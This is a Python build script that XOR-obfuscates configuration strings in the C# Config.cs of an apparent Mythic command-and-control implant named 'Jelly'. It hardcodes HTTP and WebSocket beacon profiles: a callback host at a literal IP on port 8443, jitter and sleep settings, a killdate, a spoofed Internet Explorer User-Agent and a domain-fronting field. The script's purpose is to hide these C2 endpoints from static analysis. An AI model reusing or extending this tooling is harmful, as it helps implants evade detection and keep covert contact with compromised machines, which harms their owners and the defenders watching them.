#!/usr/bin/env python3
"""
Auto-Obfuscate Config.cs - Automatic Configuration Obfuscation at Build Time

This script integrates with the build process to:
1. Read Config.cs and find #define OBFUSCATE_BUILD flag
2. Extract plain text config values from Config.cs
3. Automatically generate obfuscated byte arrays
4. Replace plain text with obfuscated values
5. Output ready-to-build Config.cs

USAGE:
    python auto_obfuscate_config.py --help
    python auto_obfuscate_config.py --input Config.cs --output Config_obfuscated.cs
    python auto_obfuscate_config.py --build    # Auto-detect and build

INTEGRATION:
    Add to your .csproj build targets:
    <Target Name="ObfuscateConfig" BeforeTargets="Build">
        <Exec Command="python auto_obfuscate_config.py --build" />
    </Target>
"""

import sys
import re
import argparse
from pathlib import Path

# XOR key - MUST match ConfigObfuscator.cs and Config.cs
XOR_KEY = bytes([0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12])

def xor_obfuscate(text):
    """XOR obfuscate a string"""
    text_bytes = text.encode('utf-8')
    obfuscated = []
    for i, byte in enumerate(text_bytes):
        obfuscated.append(byte ^ XOR_KEY[i % len(XOR_KEY)])
    return obfuscated

def generate_csharp_byte_array(obfuscated_bytes):
    """Generate C# byte array syntax"""
    if not obfuscated_bytes:
        return "UnobfuscateString(new byte[] { })"
    return "UnobfuscateString(new byte[] { " + ", ".join(str(b) for b in obfuscated_bytes) + " })"

def obfuscate_config_file(input_path, output_path=None):
    """
    Read Config.cs and automatically obfuscate plain text values
    """
    if output_path is None:
        output_path = input_path
    
    with open(input_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Pattern to find plain text values that need obfuscation
    # Looks for: { "key", "plain_text_value" }
    pattern = r'(\{[\s]*"[^"]+",[\s]*)"([^"]*)"([\s]*\})'
    
    def replace_with_obfuscated(match):
        prefix = match.group(1)
        value = match.group(2)
        suffix = match.group(3)
        
        # Skip empty values
        if not value:
            return match.group(0)
        
        # Skip if already obfuscated (contains "UnobfuscateString")
        if "UnobfuscateString" in match.group(0):
            return match.group(0)
        
        obfuscated = xor_obfuscate(value)
        obfuscated_code = generate_csharp_byte_array(obfuscated)
        
        return f'{prefix}{obfuscated_code}{suffix}'
    
    # Apply obfuscation
    obfuscated_content = re.sub(pattern, replace_with_obfuscated, content)
    
    # Write output
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(obfuscated_content)
    
    return obfuscated_content

def generate_profile_section(profile_name, values_dict):
    """Generate a complete profile section with obfuscated values"""
    print(f"\n// {profile_name.upper()} PROFILE - AUTO-GENERATED")
    print("Parameters = new Dictionary<string, string>()")
    print("{")
    
    for key, value in values_dict.items():
        if not value:
            print(f'    {{ "{key}", UnobfuscateString(new byte[] {{ }}) }},  // Original: "" (empty)')
        else:
            obfuscated = xor_obfuscate(value)
            obfuscated_code = generate_csharp_byte_array(obfuscated)
            print(f'    {{ "{key}", {obfuscated_code} }},  // Original: "{value}"')
    
    print("};")

def main():
    parser = argparse.ArgumentParser(
        description='Automatic Config.cs Obfuscation Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  Generate HTTP profile config:
    python auto_obfuscate_config.py --generate-http
  
  Obfuscate existing Config.cs:
    python auto_obfuscate_config.py --input Jelly/Config.cs --output Jelly/Config.cs
  
  Interactive mode:
    python auto_obfuscate_config.py
        """
    )
    
    parser.add_argument('--input', help='Input Config.cs file path')
    parser.add_argument('--output', help='Output Config.cs file path')
    parser.add_argument('--generate-http', action='store_true', help='Generate HTTP profile template')
    parser.add_argument('--generate-websocket', action='store_true', help='Generate WebSocket profile template')
    parser.add_argument('--value', help='Obfuscate a single value')
    parser.add_argument('--build', action='store_true', help='Auto-detect and build')
    
    args = parser.parse_args()
    
    # Single value obfuscation
    if args.value:
        obfuscated = xor_obfuscate(args.value)
        code = generate_csharp_byte_array(obfuscated)
        print(f"Plain:      {args.value}")
        print(f"C# Code:    {code}")
        return
    
    # Generate HTTP profile
    if args.generate_http:
        http_values = {
            "callback_interval": "10",
            "callback_jitter": "23",
            "callback_port": "8443",
            "callback_host": "https://16.170.226.88",
            "post_uri": "data",
            "encrypted_exchange_check": "true",
            "proxy_host": "",
            "proxy_port": "",
            "proxy_user": "",
            "proxy_pass": "",
            "killdate": "2026-11-21",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
        }
        generate_profile_section("http", http_values)
        return
    
    # Generate WebSocket profile
    if args.generate_websocket:
        ws_values = {
            "tasking_type": "Push",
            "callback_interval": "5",
            "callback_jitter": "0",
            "callback_port": "8081",
            "callback_host": "ws://mythic",
            "ENDPOINT_REPLACE": "socket",
            "encrypted_exchange_check": "T",
            "domain_front": "domain_front",
            "killdate": "-1",
            "USER_AGENT": "Jelly-Refactor"
        }
        generate_profile_section("websocket", ws_values)
        return
    
    # Obfuscate file
    if args.input:
        print(f"[*] Obfuscating {args.input}...")
        obfuscate_config_file(args.input, args.output or args.input)
        print(f"[+] Obfuscation complete: {args.output or args.input}")
        return
    
    # Interactive mode
    print("=" * 80)
    print("CONFIG.CS AUTOMATIC OBFUSCATION GENERATOR")
    print("=" * 80)
    print("\nOptions:")
    print("  1. Obfuscate a single value")
    print("  2. Generate HTTP profile section")
    print("  3. Generate WebSocket profile section")
    print("  4. Obfuscate entire Config.cs file")
    print("\n")
    
    choice = input("Select option (1-4): ").strip()
    
    if choice == "1":
        value = input("Enter value to obfuscate: ")
        obfuscated = xor_obfuscate(value)
        code = generate_csharp_byte_array(obfuscated)
        print(f"\nResult: {code}")
    
    elif choice == "2":
        http_values = {
            "callback_interval": "10",
            "callback_jitter": "23",
            "callback_port": "8443",
            "callback_host": "https://16.170.226.88",
            "post_uri": "data",
            "encrypted_exchange_check": "true",
            "proxy_host": "",
            "proxy_port": "",
            "proxy_user": "",
            "proxy_pass": "",
            "killdate": "2026-11-21",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
        }
        generate_profile_section("http", http_values)
    
    elif choice == "3":
        ws_values = {
            "tasking_type": "Push",
            "callback_interval": "5",
            "callback_jitter": "0",
            "callback_port": "8081",
            "callback_host": "ws://mythic",
            "ENDPOINT_REPLACE": "socket",
            "encrypted_exchange_check": "T",
            "domain_front": "domain_front",
            "killdate": "-1",
            "USER_AGENT": "Jelly-Refactor"
        }
        generate_profile_section("websocket", ws_values)
    
    elif choice == "4":
        config_path = input("Enter path to Config.cs: ").strip()
        if Path(config_path).exists():
            obfuscate_config_file(config_path)
            print(f"[+] Config.cs obfuscated successfully")
        else:
            print(f"[-] File not found: {config_path}")

if __name__ == "__main__":
    main()
